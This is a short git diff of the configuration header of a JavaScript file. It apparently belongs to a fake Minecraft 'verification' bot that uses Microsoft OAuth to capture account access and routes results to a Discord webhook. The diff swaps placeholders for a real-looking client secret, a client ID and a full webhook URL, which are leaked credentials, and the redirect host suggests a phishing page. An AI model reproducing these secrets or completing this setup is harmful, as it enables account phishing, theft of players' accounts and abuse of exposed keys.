@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = 'it is what it is'
+const client_secret = 'zKg8Q~aePETEW6QeOatpMxD50XTAyX.gVv7YkbFx' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '7cb4dbbc-5e88-4a72-80aa-f6d49a00e4d0'
 const redirect_uri = 'https://verification-botmc.onrender.com'
-const webhook_url = 'ur shit ass webhook mf'
+const webhook_url = 'https://discord.com/api/webhooks/1045024199028248678/eqgqPrXXuTGUO0Zfel0cZln2rZN8focNPCvJYktzVLtAs8Nsfju67CVk3S3SCyVxk7a0                             '
 
 //Requirements
 const axios = require('axios')
